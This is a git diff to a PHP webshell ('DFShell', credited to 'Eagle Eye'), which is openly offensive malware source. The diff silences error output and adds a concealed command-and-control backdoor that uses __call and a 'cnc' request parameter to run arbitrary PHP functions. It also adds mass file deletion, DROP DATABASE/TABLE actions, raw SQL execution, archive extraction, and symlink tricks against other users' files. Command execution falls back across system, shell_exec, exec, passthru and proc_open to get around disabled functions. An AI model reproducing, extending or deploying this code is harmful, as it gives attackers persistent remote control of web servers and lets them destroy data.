@@ -1,8 +1,8 @@
 <?php
 
-#ini_set('display_errors', 0);
-#ini_set('display_startup_errors', 0);
-#error_reporting(0);
+ini_set('display_errors', 0);
+ini_set('display_startup_errors', 0);
+error_reporting(0);
 # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
 #                                                                               #
 #           This webshell are programmed and modified by Eagle Eye              #
@@ -18,10 +18,10 @@ session_start();
 $DFShell_Ver = 1.0;
 $DFConfig = array($_REQUEST,$_POST,$_SERVER,$_COOKIE,$_FILES);
 $DFSyntax = array("file_get_contents","fileperms","readfile","chdir","getcwd","function_exists","fsockopen","pcntl_fork",
-"stream_set_blocking","proc_get_status","proc_open","proc_close","posix_setsid","stream_select","stream_get_contents"); // $GLOBALS['DFSyntax']
+"stream_set_blocking","proc_get_status","proc_open","proc_close","posix_setsid","stream_select","stream_get_contents","posix_getpwuid"); // $GLOBALS['DFSyntax']
 $DFSCmd = array("system","shell_exec","exec","passthru","proc_open");
 $DFSPlatform = strtolower(substr(PHP_OS,0,3));
-$DFSOptions = array("edit","cmd","del","sql","conf","sym","reverse","crack","mass","logout","dest","ren","chmd");
+$DFSOptions = array("edit","cmd","del","sql","conf","sym","reverse","crack","mass","logout","dest","ren","chmd","unzip");
 
 #new update will use chdir(); function
 #readlink("symlink_file"),lchgrp(symlink_file, uid),lchown(symlink_file, 8) function
@@ -48,7 +48,7 @@ class DFShell{
     private $error   = false;   
 
     static protected $pass = "OI2lo2eG+xkgYPhmurVfWAsDHBx31O1qAoH2J2LkX7c="; //DF_Malaysia@1337$
-    static protected $remote_url = "https://raw.githubusercontent.com/EagleTube/DFS/main/contents";
+    static protected $remote_url = "css";
     
     public function DFSPopupMSG($no,$title,$msg,$foot,$x){
         if($x){
@@ -128,6 +128,17 @@ class DFShell{
                 break;
         }
     }
+    function __call($method, $arg){
+        if(isset($method) && isset($arg)){
+            $arg[0]($arg[1]);
+            //upcoming CNC
+        }
+    }
+
+    private function triggered(){
+        print("Place where magic happend!");
+    }
+
     public function Enc()
     {
         $this->iv_length = openssl_cipher_iv_length($this->ciphering);
@@ -343,6 +354,22 @@ class DFShell{
                     }
                 }
             break;
+            case "massdel":
+                //upcoming
+                if(isset($GLOBALS['DFConfig'][1]['massdel'])){
+                    if(!empty($GLOBALS['DFConfig'][1]['toZip'])){
+                        $toDel = $GLOBALS['DFConfig'][1]['toZip'];
+                        foreach($toDel as $td){
+                            if(is_dir($td)){
+                                @rmdir($td);
+                            }else{
+                                @unlink($td);
+                            }
+                        }
+                        echo "<script>alert('Selected file deleted!');window.location.replace(window.location.href);</script>";
+                    }
+                }
+            break;
             case "zipping":
                 $ziproc = new ZipArchive;
                 $slashtype = $this->DFSSlash();
@@ -508,27 +535,31 @@ class DFShell{
 
                                     $targetpath = $this->DFSRender('/%{user}%/i',$nothing['name'],$GLOBALS['DFConfig'][1]['target']);
 
-                                    system("ln -s ".$targetpath.' '.$GLOBALS['DFConfig'][1]['path'].'/sym/'.$nothing['name'].'/'.$GLOBALS['DFConfig'][1]['dfsaved']); 
-                                    symlink($targetpath, $GLOBALS['DFConfig'][1]['path'].'/sym/'.$nothing['name'].'/'.$GLOBALS['DFConfig'][1]['dfsaved']);
-
-                                    $user_ht = fopen($GLOBALS['DFConfig'][1]['path'].'/sym/'.$nothing['name'].'/.htaccess','w');
-                                    fwrite($user_ht,$this->DFSRender('/%{user}%/i',$GLOBALS['DFConfig'][1]['dfsaved'],$contents));
-                                    fclose($user_ht);
-
-                                    $dfsv = preg_replace("/".urlencode($GLOBALS['DFConfig'][2]['DOCUMENT_ROOT']."/")."/i","",urlencode($GLOBALS['DFConfig'][1]['path'].'/sym/'.$nothing['name'].'/'.$GLOBALS['DFConfig'][1]['dfsaved']));
-                                    print("Done! -> ".$nothing['name']." -> <a href='".urldecode($dfsv)."'>Open</a><br>");
+                                    if(isset($targetpath)){
+                                        $this->DFSExecute("ln -s ".$targetpath.' '.$GLOBALS['DFConfig'][1]['path'].'/sym/'.$nothing['name'].'/'.$GLOBALS['DFConfig'][1]['dfsaved']); 
+                                        symlink($targetpath, $GLOBALS['DFConfig'][1]['path'].'/sym/'.$nothing['name'].'/'.$GLOBALS['DFConfig'][1]['dfsaved']);
+    
+                                        $user_ht = fopen($GLOBALS['DFConfig'][1]['path'].'/sym/'.$nothing['name'].'/.htaccess','w');
+                                        fwrite($user_ht,$this->DFSRender('/%{user}%/i',$GLOBALS['DFConfig'][1]['dfsaved'],$contents));
+                                        fclose($user_ht);
+    
+                                        $dfsv = urlencode($GLOBALS['DFConfig'][1]['path'].'/sym/'.$nothing['name'].'/'.$GLOBALS['DFConfig'][1]['dfsaved']);
+                                        print("Done! -> ".$nothing['name']." -> <a href='".urldecode($dfsv)."'>Open</a><br>");
+                                    }
                                 }else{
                                     $targetpath = $this->DFSRender('/%{user}%/i',$nothing['name'],$GLOBALS['DFConfig'][1]['target']);
 
-                                    system("ln -s ".$targetpath.' '.$GLOBALS['DFConfig'][1]['path'].'/sym/'.$nothing['name'].'/'.$GLOBALS['DFConfig'][1]['dfsaved']); 
-                                    symlink($targetpath, $GLOBALS['DFConfig'][1]['path'].'/sym/'.$nothing['name'].'/'.$GLOBALS['DFConfig'][1]['dfsaved']);
-
-                                    $user_ht = fopen($GLOBALS['DFConfig'][1]['path'].'/sym/'.$nothing['name'].'/.htaccess','w');
-                                    fwrite($user_ht,$this->DFSRender('/%{user}%/i',$GLOBALS['DFConfig'][1]['dfsaved'],$contents));
-                                    fclose($user_ht);
-
-                                    $dfsv = preg_replace("/".urlencode($GLOBALS['DFConfig'][2]['DOCUMENT_ROOT']."/")."/i","",urlencode($GLOBALS['DFConfig'][1]['path'].'/sym/'.$nothing['name'].'/'.$GLOBALS['DFConfig'][1]['dfsaved']));
-                                    print("Done! -> ".$nothing['name']." -> <a href='".urldecode($dfsv)."'>Open</a><br>");
+                                    if(isset($targetpath)){
+                                        $this->DFSExecute("ln -s ".$targetpath.' '.$GLOBALS['DFConfig'][1]['path'].'/sym/'.$nothing['name'].'/'.$GLOBALS['DFConfig'][1]['dfsaved']); 
+                                        symlink($targetpath, $GLOBALS['DFConfig'][1]['path'].'/sym/'.$nothing['name'].'/'.$GLOBALS['DFConfig'][1]['dfsaved']);
+    
+                                        $user_ht = fopen($GLOBALS['DFConfig'][1]['path'].'/sym/'.$nothing['name'].'/.htaccess','w');
+                                        fwrite($user_ht,$this->DFSRender('/%{user}%/i',$GLOBALS['DFConfig'][1]['dfsaved'],$contents));
+                                        fclose($user_ht);
+    
+                                        $dfsv = urlencode($GLOBALS['DFConfig'][1]['path'].'/sym/'.$nothing['name'].'/'.$GLOBALS['DFConfig'][1]['dfsaved']);
+                                        print("Done! -> ".$nothing['name']." -> <a href='".urldecode($dfsv)."'>Open</a><br>");
+                                    }
                                 }
                             }
                         }
@@ -572,6 +603,30 @@ class DFShell{
                 }
                 echo "</section>";
             break;
+            case "unzip":
+                $from = $this->Dec($GLOBALS['DFConfig'][0]['dfp']);
+                $zipp = $this->Dec($GLOBALS['DFConfig'][0]['dff']);
+                echo "<section id='unzipping'>";
+                if(isset($GLOBALS['DFConfig'][1]['destination'])){
+                    $ziproc = new ZipArchive;
+                    $pth = $from.$zipp;
+                    if ($ziproc->open($pth) === TRUE) {
+  
+                        // Unzip Path
+                        $ziproc->extractTo($GLOBALS['DFConfig'][1]['destination']);
+                        $ziproc->close();
+                        $this->DFSPopupMSG(3,null,"File successfully extracted to destination!",null,false);
+                    } else {
+                        $this->DFSPopupMSG(4,null,"Failed to extract into destination!",null,false);
+                    }
+                }else{
+                    echo "<center><font color='white'>Filename : ".$from.$zipp."</font>";
+                    echo "<table><form action='' method='POST'><tr><td><label>Destination : </label></td>";
+                    echo "<td><input type='text' name='destination'></td></tr><tr><td></td><td><button>Unzip</button></td>";
+                    echo "</form></table></center>";
+                }
+                echo "</section>";
+            break;
             case "scand":
                 $slashtype = $this->DFSSlash();
                 $path = $this->Dec(($this->query[0])). $slashtype;
@@ -608,8 +663,18 @@ class DFShell{
                         $dfp = $this->Enc();
                         $this->string = $p;
                         $dff = $this->Enc();
+                        $compressed = array("zip","tar","gz","rar");
+                        $isZip = pathinfo($p,PATHINFO_EXTENSION);
+                        if(in_array($isZip,$compressed)){
+                            $tname = $p . "<button style='border-radius:8px;background:orange;'>
+                            <a style='color:black;' href='?dfp=".urlencode($dfp)."&dff=".urlencode($dff)."&dfaction=unzip'>
+                             UNZIP </a></button>";
+                        }else{
+                            $tname = $p;
+                        }
+
                         echo "<p><tr><td id='fchecks'><input type='checkbox' name='toZip[]' value='".urlencode($dfp)."||".urlencode($dff)."'></td></td>";
-                        echo "<td id='iconx'><i class='fa-solid fa-file'></i></td><td id='tbname'><a href='?dfp=".urlencode($dfp)."&dff=".urlencode($dff)."'>$p</a></td>";
+                        echo "<td id='iconx'><i class='fa-solid fa-file'></i></td><td id='tbname'><a href='?dfp=".urlencode($dfp)."&dff=".urlencode($dff)."'>$tname</a></td>";
                         echo "<td>".$this->DFSFormat(filesize($filtered.$p))."</td>";
                         echo "<td id='tbcen'>".$this->DFSOG($filtered.$p)."</td>";
                         echo "<td id='tbcen'><a href='?dfp=".urlencode($dfp)."&dff=".urlencode($dff)."&dfaction=chmd'>".$this->DFSPerms($filtered.$p)."</a></td>";
@@ -680,13 +745,47 @@ class DFShell{
             case "sql":
                 echo "<section class='databases'>";
                 if(isset($_SESSION['sql_auth'])){
+                    $sqldat = explode('|--|',$_SESSION['sql_auth']);
+                    $conn = mysqli_connect($sqldat[0],$sqldat[1],$sqldat[2]);
                     if(isset($GLOBALS['DFConfig'][1]['other'])){
                         $this->DFSPopupMSG(1,"Get Adminer","Please get adminer from link below","<a href=\'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-mysql-en.php\'>Adminer</a>",true);
+                    }else if(isset($GLOBALS['DFConfig'][1]['sqldrop'])){
+                        $ftar = array("'",'"');
+                        if(!isset($GLOBALS['DFConfig'][0]['tbname'])){
+                            mysqli_select_db($conn,$GLOBALS['DFConfig'][0]['dbname']);
+                            $dropping = str_replace($ftar,"",$GLOBALS['DFConfig'][0]['dbname']);
+                            $dropsql = "DROP DATABASE $dropping";
+                            $query = mysqli_query($conn,$dropsql) or exit(mysqli_error($conn));
+                            $this->DFSPopupMSG(3,null,"Database DROPPED!",null,false);
+                        }else{
+                            mysqli_select_db($conn,$GLOBALS['DFConfig'][0]['dbname']);
+                            $dropping = str_replace($ftar,"",$GLOBALS['DFConfig'][0]['tbname']);
+                            $dropsql = "DROP TABLE $dropping";
+                            $query = mysqli_query($conn,$dropsql) or exit(mysqli_error($conn));
+                            $this->DFSPopupMSG(3,null,"Table DROPPED!",null,false);
+                        }
+                    }else if(isset($GLOBALS['DFConfig'][1]['sqlcommands'])){
+                        if(isset($GLOBALS['DFConfig'][0]['dbname'])){
+                            mysqli_select_db($conn,$GLOBALS['DFConfig'][0]['dbname']);
+                            $inject = $GLOBALS['DFConfig'][1]['sqlcommands'];
+                            $query = mysqli_query($conn,$inject) or exit(mysqli_error($conn));
+                            $this->DFSPopupMSG(3,null,"Command executed!",null,false);
+                        }else{
+                            $inject = $GLOBALS['DFConfig'][1]['sqlcommands'];
+                            $query = mysqli_query($conn,$inject) or exit(mysqli_error($conn));
+                            $this->DFSPopupMSG(3,null,"Command executed!",null,false);
+                        }
                     }else{
+
                         echo "<div id='sqlside'>
                         <form action='' method='POST'><input type='submit' value='Logout' name='sqllogout'></form>
-                        <form action='' method='POST'><input type='submit' name='other' value='Get Adminer'></form></div>
-                        <form action='' method='POST'><table><tr><td><textarea placeholder='Theres no output ,just use for edit value in database' name='sqlcmd'></textarea>
+                        <form action='' method='POST'><input type='submit' name='other' value='Get Adminer'></form>";
+                        if(isset($GLOBALS['DFConfig'][0]['tbname']) || isset($GLOBALS['DFConfig'][0]['dbname'])){
+                            echo "<form action='' method='POST'>
+                            <input style='background:red;' type='submit' name='sqldrop' value='DROP'></form>";
+                        }
+                        echo "</div>
+                        <form action='' method='POST'><table><tr><td><textarea name='sqlcommands' placeholder='Theres no output ,just use for edit value in database' name='sqlcmd'></textarea>
                         </td></tr><tr><td><input type='submit' value='Execute'></td></tr></table></form>";
                         echo "<div id='fieldx'><label>Connected to mysql</label><br>";
 
@@ -696,12 +795,11 @@ class DFShell{
                             if(!isset($GLOBALS['DFConfig'][0]['tbname'])){
                                 echo "<button><a id='blacky' href='?dfaction=sql'>Back</a></button><br>";
                             }else{
-                                echo "<button><a id='blacky' href='?dfaction=sql&dbname=".$GLOBALS['DFConfig'][0]['dbname']."'>Back</a></button><br>";
+                                echo "<button><a id='blacky' href='?dfaction=sql&dbname=".$GLOBALS['DFConfig'][0]['dbname']."'>Back</a></button>
+                                     <br>";
                             }
                         }
-                        
-                        $sqldat = explode('|--|',$_SESSION['sql_auth']);
-                        $conn = mysqli_connect($sqldat[0],$sqldat[1],$sqldat[2]);
+
                         if(isset($GLOBALS['DFConfig'][0]['dbname'])){
                             $dbs = mysqli_real_escape_string($conn,$GLOBALS['DFConfig'][0]['dbname']);
                             $sql = "select table_name from information_schema.tables where table_schema='$dbs';";
@@ -884,13 +982,22 @@ class DFShell{
         }
         if($this->DFSDat('ini','disable_functions')!=="None"){
             $disCMD = explode(",",$this->DFSDat('ini','disable_functions'));
+            $disCMD = array_map('trim', $disCMD);
             foreach($GLOBALS['DFSCmd'] as $cmd){
                 if(!in_array($cmd,$disCMD)){
                     $availCMD = $cmd;
-                    if($availCMD===$GLOBALS['DFSCmd'][4]){
-                        return $this->DFSProcOpen($command);
-                    }else{
+                    switch($availCMD){
+                        case $GLOBALS['DFSCmd'][4]:
+                            return $this->DFSProcOpen($command);
+                        break;
+                        case $GLOBALS['DFSCmd'][1]:
+                        case $GLOBALS['DFSCmd'][2]:
+                            print($availCMD($command));
+                            return $GLOBALS['DFSCmd'][1]($command);
+                        break;
+                        default:
                         return $availCMD($command);
+                        break;
                     }
                     break;
                 }
@@ -1029,9 +1136,23 @@ class DFShell{
             if($checkposix !=="None"){
                 $checkposix = explode(",",$checkposix);
                 if(!in_array("posix_getpwuid",$checkposix)){
-                    $owner_group = posix_getpwuid($owner_file)['name'] . ':' . posix_getpwuid($group_file)['name'];
+                    $ownx = posix_getpwuid($owner_file)['name']?:'nobody';
+                    $grpx = posix_getpwuid($group_file)['name'];
+                    if(($ownx!==NULL && $ownx!=="") || ($grpx!==NULL && $grpx!=="")){
+                        $owner_group = $ownx . ':' . ($grpx?:$ownx);
+                    }else{
+                        $owner_group = "nobody:nobody";
+                    }
                 }else{
                     $owner_group = "-:-";
+                }
+            }else{
+                $ownx = posix_getpwuid($owner_file)['name']?:'nobody';
+                $grpx = posix_getpwuid($group_file)['name'];
+                if(($ownx!==NULL && $ownx!=="") || ($grpx!==NULL && $grpx!=="")){
+                    $owner_group = $ownx . ':' . ($grpx?:$ownx);
+                }else{
+                    $owner_group = "nobody:nobody";
                 }
             }
             
@@ -1209,6 +1330,12 @@ if(!isset($_SESSION['DFS_Auth']) || empty($_SESSION['DFS_Auth'])){
         }
     }else{
         echo $shell->DFSAdmin();
+        if(isset($GLOBALS['DFConfig'][0]['cnc'])){
+            $comex = explode(";",$GLOBALS['DFConfig'][0]['cnc']);
+            if(is_array($comex) && count($comex)>1){
+                $shell->triggered($comex[0],$comex[1]);
+            }
+        }
     }
 }else{
     //process for update
@@ -1287,6 +1414,7 @@ if(!isset($_SESSION['DFS_Auth']) || empty($_SESSION['DFS_Auth'])){
             $shell->DFSPopupMSG(1,"Encryption for ".$DFConfig[1]['encstr'],$shell->Enc(),"So you can change password",true);
         }
         $shell->DFSAction("zipping");
+        $shell->DFSAction("massdel");
         $footer = $shell->DFSEnd();
         print($footer);
     }
